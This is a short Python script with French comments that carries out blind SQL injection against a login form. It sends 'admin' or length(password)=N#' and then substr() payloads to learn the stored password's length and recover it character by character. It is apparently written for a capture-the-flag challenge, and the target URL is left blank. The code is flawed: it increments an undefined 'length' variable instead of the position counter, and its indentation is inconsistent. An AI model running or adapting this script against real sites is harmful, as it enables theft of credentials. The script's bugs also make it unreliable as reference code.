import requests
import re
 
cookies=dict(session='') # cookie de session (nécessaire ou non)
 
trouve = 0
longueur = 0 # variable stockant la longueur du flag/password
 
while (trouve == 0):
	injection = "admin' or length(password)="+str(longueur)+"#" # Injection permettant de trouver la longueur du flag en incrémentant la longueur à chaque tour de boucle
	req = {'password':injection, 'nonce':''} # Ajouter le nonce si nécessaire
	resultat = requests.post('', cookies=cookies, data=req).text
	regex = re.search("<center>Authentification valide. Le mot de passe est le flag.</center>",resultat) # Regex permettant de voir si la longueur essayée est la bonne en testant le message de retour
        if regex is not None:
		trouve = 1
	else:
		longueur += 1 # si la longueur n'est pas bonne on l'incrémente de 1
 
print("La longueur du flag est : %d" % longueur)
trouve = 0
l = 1 # numéro de caractère cherché
caractere = 48 # On débute le test des caractères à partir du 48e de la table ASCII
final_pass = "" # Variable contenant le flag
 
while(trouve==0):
	injection = "admin' or substr(password,"+str(l)+",1"+")='"+str(chr(caractere))+"'#"
	req = {'password':injection, 'nonce':''}
	resultat = requests.post('', cookies=cookies, data=req).content
	regex = re.search("<center>Authentification valide. Le mot de passe est le flag.</center>",resultat)
	if regex is not None:
		if (l != longueur):
			final_pass += chr(caractere) # si le caractère est bon on l'ajoute à notre variable
			length += 1 # puis on passe au suivant
			caractere = 48 # et on recommence à 0  
                        print ("Le flag est : %s " % final_pass) # On affiche progressivement l'état du flag final
		else:
			final_pass += chr(caractere) # si c'est le dernier caractère
			trouve = 1 # on sort de la boucle
	else:
		caractere += 1 # si le caractère essayé n'est pas correct on essaye le suivant
 
print ("Le flag est : %s " % final_pass)
